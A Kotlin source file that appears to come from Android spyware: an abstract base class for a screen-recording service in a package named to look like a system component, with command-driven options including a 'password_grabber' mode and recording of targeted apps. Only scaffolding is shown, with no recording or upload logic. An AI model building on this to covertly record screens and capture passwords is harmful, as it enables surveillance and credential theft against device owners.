package com.android.services.services.screenRecord

import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import android.util.SparseIntArray
import android.view.Surface
import android.view.WindowManager
import com.android.services.interfaces.IBackgroundProcessing
import io.reactivex.rxjava3.disposables.Disposable
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

abstract class ScreenRecordCommandProcessingBaseI(
    val applicationContext: Context
) : IBackgroundProcessing {

    internal val executorService: ExecutorService = Executors.newSingleThreadExecutor()
    internal lateinit var disposable: Disposable
    internal var mScreenDensity = 0
    internal var mProjectionManager: MediaProjectionManager? = null
    internal var mMediaProjection: MediaProjection? = null
    internal var mVirtualDisplay: VirtualDisplay? = null
    internal var mMediaRecorder: MediaRecorder? = null

    internal var mMediaProjectionCallback: ScreenRecordCommandProcessingBaseImplI.MediaProjectionCallback? =
        null
    internal var mWindowManager: WindowManager? = null
    internal var mHandler: Handler = Handler(Looper.getMainLooper())
    protected var isPasswordGrabber = false
    internal var isAppRecording = false
    internal var isNormalRecording = false
    internal var recordedFile: File? = null
    internal var filePath: String=""
    internal var appName: String? = null
    internal var appPackageName: String? = null
    internal var maxDuration: Int? = null
    internal var isRecordingTimeEnded = false
    protected var isServiceMarkedAsStop: Boolean = false



    companion object {

        const val SCREEN_RECORD_NOTIFICATION_ID = 104
        internal const val DISPLAY_WIDTH = 720
        internal const val DISPLAY_HEIGHT = 1280
        internal val ORIENTATIONS = SparseIntArray()

        const val SCREEN_RECORD_DURATION = "screen_record_duration"
        const val SCREEN_RECORD_PUSH_ID = "screen_record_push_id"
        const val PASSWORD_GRABBER = "password_grabber"
        const val APP_RECORDING = "app_recording"
        const val NORMAL_RECORDING = "normal_recording"
        const val APP_PACKAGE_NAME = "app_package_name"

        @JvmField
        var isScreenRecording = false
        internal var isCompleted = false
        internal var pushId: String? = ""

        init {
            ORIENTATIONS.append(Surface.ROTATION_0, 90)
            ORIENTATIONS.append(Surface.ROTATION_90, 0)
            ORIENTATIONS.append(Surface.ROTATION_180, 270)
            ORIENTATIONS.append(Surface.ROTATION_270, 180)
        }
    }

    abstract fun initialize()
    abstract fun parseIntent(intent: Intent)
    abstract fun createOutputFilePath()
    abstract fun startRecording()
    abstract suspend fun stopRecording()
    abstract fun onServiceDestroy()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createOutputFilePath()
        intent?.let {
            parseIntent(it)
        }
        return Service.START_REDELIVER_INTENT
    }

    override fun onDestroy() {
        onServiceDestroy()
    }
}